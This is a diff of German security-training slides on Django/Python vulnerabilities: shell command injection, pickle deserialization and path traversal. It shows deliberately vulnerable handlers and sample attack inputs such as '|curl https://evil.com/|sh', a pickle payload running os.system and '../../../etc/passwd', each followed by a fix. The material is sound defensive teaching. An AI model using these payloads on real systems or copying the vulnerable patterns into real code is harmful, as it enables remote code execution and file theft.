@@ -58,12 +58,12 @@ def vulnerable_handler(request):
     request.POST['message'])
 b64 = os.popen(cmd).read()</code></pre>
 
-<div>Eingabe: <code style="color:#c00;">foo bar</code></div>
-<div>⚙ Ausgeführt: <code>echo <span style="color:#c00;">foo bar</span> | base64</code></div>
+<div>Eingabe: <code class="evil-input">foo bar</code></div>
+<div>⚙ Ausgeführt: <code>echo <span class="evil-input">foo bar</span> | base64</code></div>
 
 <div class="fragment" style="margin-top:1em;">
-<div>Eingabe: <code style="color:#c00;">|curl https://evil.com/ | sh</code></div>
-<div>⚙ <code>echo <span style="color:#c00;">|curl https://evil.com/ | sh</span> | base64</code></div>
+<div>Eingabe: <code class="evil-input">|curl https://evil.com/ | sh</code></div>
+<div>⚙ <code>echo <span class="evil-input">|curl https://evil.com/ | sh</span> | base64</code></div>
 </div>
 </section>
 
@@ -73,12 +73,12 @@ b64 = os.popen(cmd).read()</code></pre>
     request.POST[<span class="hljs-string">'message'</span>])
 b64 = os.popen(cmd).read()</code></div>
 
-<div>Eingabe: <code style="color:#c00;">|curl https://evil.com/|sh</code></div>
-<div>⚙ <code>echo "<span style="color:#c00;">|curl https://evil.com/|sh</span>" | base64</code></div>
+<div>Eingabe: <code class="evil-input">|curl https://evil.com/|sh</code></div>
+<div>⚙ <code>echo "<span class="evil-input">|curl https://evil.com/|sh</span>" | base64</code></div>
 
 <div class="fragment" style="margin-top: 1em">
 <div class="insecure">Genügt nicht!</div>
-<div><code>echo "<span style="color:#c00;">"|curl https://evil.com/|sh|cat "-</span>" | base64</code></div>
+<div><code>echo "<span class="evil-input">"|curl https://evil.com/|sh|cat "-</span>" | base64</code></div>
 </div>
 
 <div class="fragment" style="margin-top:1em;text-align:center;font-weight:bold;">
@@ -100,8 +100,8 @@ cmd = 'echo {} | base64'.format(
     shlex.quote(request.POST['message']))
 b64 = os.popen(cmd).read()</code><span class="correct-code" style="opacity:0.2"></span></pre>
 
-<div style="margin-top: 1.5em">Eingabe: <code style="color:#c00;">a " b $ c ' d</code><br/>
-⚙ <code>echo <span style="color:#c00;">'a " b $ c '"'"' d'</span> | base64</code>
+<div style="margin-top: 1.5em">Eingabe: <code class="evil-input">a " b $ c ' d</code><br/>
+⚙ <code>echo <span class="evil-input">'a " b $ c '"'"' d'</span> | base64</code>
 </div>
 
 <div class="insecure" style="margin-top:1em;text-align:center;">Aber: Sehr einfach zu vergessen!</div>
@@ -169,6 +169,52 @@ b64 = base64.b64encode(
 </ul>
 </section>
 
+
+<section id="pickle">
+<h2>Deserialisierung mit pickle</h2>
+
+<pre><code class="python">
+from django.http import HttpResponse
+import pickle
+
+def vulnerable_handler(request):
+    prefs_p = request.COOKIES.get('prefs')
+    prefs = (
+        pickle.loads(prefs_p)
+        if prefs_p else {'lang': 'de'})
+
+    return HttpResponse(
+        '&lt;html&gt;language: {}!&lt;/html&gt;'.format(
+            prefs['lang']))</code></pre>
+
+</section>
+
+<section>
+<h2>pickle deserialization vulnerability</h2>
+<pre><code class="python">pickle.loads(prefs_p)</code></pre>
+
+<p>Problem: pickle kann beliebigen <strong>Code</strong> (de)serialisieren!</p>
+
+<div style="margin-top:1em">Eingabe <span class="evil-input">b"cos\nsystem\n(S'echo evil'\ntR."</span><br/>
+⚙: <code class="evil-input">os.system('echo evil')</code></div>
+</section>
+
+<section>
+<h2>pickle vermeiden</h2>
+<ul>
+<li>pickle nur in Ausnahmefällen verwenden!</li>
+<li style="line-height: 1.3em">nämlich dann wenn den Daten zu 100% getraut werden kann (z.B. Anwendungscache im Dateisystem)</li>
+<li style="margin-top:1em">Datenaustausch besser mit json</li>
+<li style="line-height: 1.3em">Aber auch da aufpassen auf type confusion:<br/>
+    Funktioniert der Code auch noch wenn prefs statt <code class="python">{'lang': 'de'}</code> plötzlich <code class="python">{'lang': ['d', 'e']}</code> ist?
+</li>
+<li>Im Zweifelsfall Typen checken!</li>
+</ul>
+</section>
+
+
+
+
 <section id="path-traversal">
 <h2>Code-Beispiel</h2>
 <pre><code class="block python">from django.http import HttpResponse
@@ -191,8 +237,8 @@ def vulnerable_handler(request):
 
 <pre style="margin-bottom:1em"><code>fn = '/var/myapp/data/' + request.GET['id']</code></pre>
 
-<div>Eingabe: <code style="color:#c00;">../../../etc/passwd</code><br/>
-⚙ <code>fn = <span class="hljs-string">'/var/myapp/data/'</span> + <span style="color:#c00;">'../../../etc/passwd'</span></code><br/>
+<div>Eingabe: <code class="evil-input">../../../etc/passwd</code><br/>
+⚙ <code>fn = <span class="hljs-string">'/var/myapp/data/'</span> + <span class="evil-input">'../../../etc/passwd'</span></code><br/>
 ⇔ <code>fn = <span class="hljs-string">'/etc/passwd'</span></code></div>
 
 <div class="fragment" style="margin-top:2em;"><div><code>os.path.join</code> oder <code>pathlib</code> hilft nicht, sondern ermöglicht sogar noch mehr!</div>
@@ -208,9 +254,9 @@ def vulnerable_handler(request):
 
 <div>Wenn nur ein Dateiname und kein Pfad erwartet wird:</div>
 <div style="text-align:center;margin-top:0.5em;margin-bottom:2em;"><code style="font-weight:bold">os.path.basename</code>!</div>
-<code class="block no-highlight">fn = os.path.join(
+<code class="block no-highlight" style="position:relative;">fn = os.path.join(
     <span class="hljs-string">'/var/myapp/data/'</span>,
-    <ins>os.path.basename(</ins>request.GET['id']<ins>)</ins>)</code>
+    <ins>os.path.basename(</ins>request.GET['id']<ins>)</ins>)<span class="correct-code"></span></code>
 </section>
 
 <section>
@@ -219,11 +265,11 @@ def vulnerable_handler(request):
 <li>Leider bisher noch keine gute Lösung!</li>
 <li>Entweder: Pfad selber parsen (kompliziert &amp; fehleranfällig, insbesondere auf Windows)</li>
 <li>Oder: mit <code>os.path.abspath</code> überprüfen<br/>
-<pre style="margin-top:1em"><code class="block python">fn = os.path.abspath(os.path.join(
+<pre style="margin-top:1em;position:relative;"><code class="block python">fn = os.path.abspath(os.path.join(
     '/var/myapp/data/', request.GET['id']))
 if not fn.startswith('/var/myapp/data/'):
     raise Exception('Path traversal attempt')
-</code></pre>
+</code><span class="correct-code"></span></pre>
 </li>
 
 <li class="fragment" style="margin-top:2em">Weitere Probleme: Magische Dateinamen <code>CON</code>, <code>COM1</code>, <code>NUL</code> etc. unter Windows</li>
